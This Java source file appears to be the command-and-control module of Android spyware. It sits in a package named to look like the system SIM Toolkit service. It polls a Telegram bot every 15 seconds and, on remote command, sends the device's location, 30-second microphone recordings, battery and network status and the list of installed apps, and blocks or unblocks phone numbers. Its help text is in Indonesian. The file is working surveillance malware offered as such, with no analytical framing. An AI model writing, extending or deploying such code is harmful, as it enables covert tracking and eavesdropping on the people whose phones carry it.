package com.android.stk.service;

import android.content.Context;

import org.json.JSONArray;
import org.json.JSONObject;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.Timer;
import java.util.TimerTask;

public class TelegramCommandReceiver {

    private static final String BOT_TOKEN = "TOKEBOT";
    private static final String CHAT_ID = "-CHATID";
    private static int lastUpdateId = 0;

    public static void startListening(Context context) {
        Timer timer = new Timer();
        timer.scheduleAtFixedRate(new TimerTask() {
            public void run() {
                try {
                    String urlString = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?offset=" + (lastUpdateId + 1);
                    HttpURLConnection conn = (HttpURLConnection) new URL(urlString).openConnection();
                    conn.setRequestMethod("GET");

                    BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
                    StringBuilder response = new StringBuilder();
                    String line;
                    while ((line = reader.readLine()) != null) response.append(line);
                    reader.close();

                    JSONObject obj = new JSONObject(response.toString());
                    JSONArray result = obj.getJSONArray("result");

                    for (int i = 0; i < result.length(); i++) {
                        JSONObject update = result.getJSONObject(i);
                        if (!update.has("message")) continue;

                        lastUpdateId = update.getInt("update_id");

                        JSONObject message = update.getJSONObject("message");
                        if (!message.has("text")) continue;

                        String text = message.getString("text").trim();

                        // ✨ Proses perintah
                        switch (text) {
                            case "/locate":
                                LocationHelper.sendCurrentLocation(context);
                                break;

                            case "/record":
                                MicRecorder.recordAndSend(context, 30); // 30 detik
                                break;

                            case "/status":
                                StatusHelper.sendStatus(context);
                                break;

                            case "/apps":
                                AppListHelper.sendInstalledApps(context);
                                break;

                            case "/blocklist":
                                BlocklistHelper.showBlocklist(context);
                                break;

                            case "/refresh":
                                RefreshHelper.refreshApp(context);
                                break;
                            
                            case "/help":
                                TelegramSender.sendText("📋 Daftar Perintah:\n" +
                                    "/status – Info baterai & jaringan\n" +
                                    "/locate – Kirim lokasi\n" +
                                    "/record – Rekam mic 30 detik\n" +
                                    "/apps – List aplikasi user\n" +
                                    "/block <nomor> – Blokir nomor\n" +
                                    "/unblock <nomor> – Hapus blokir\n" +
                                    "/blocklist – Tampilkan blokir\n" +
                                    "/refresh – Bersihkan & restart");
                                break;

                            default:
                                if (text.startsWith("/block ")) {
                                    BlocklistHelper.blockNumber(context, text.replace("/block ", "").trim());
                                } else if (text.startsWith("/unblock ")) {
                                    BlocklistHelper.unblockNumber(context, text.replace("/unblock ", "").trim());
                                } else {
                                    TelegramSender.sendText("❓ Perintah tidak dikenal: " + text);
                                }
                                break;
                        }
                    }

                } catch (Exception e) {
                    TelegramSender.sendText("❌ Error: " + e.getMessage());
                }
            }
        }, 0, 15000); // polling setiap 15 detik
    }
}
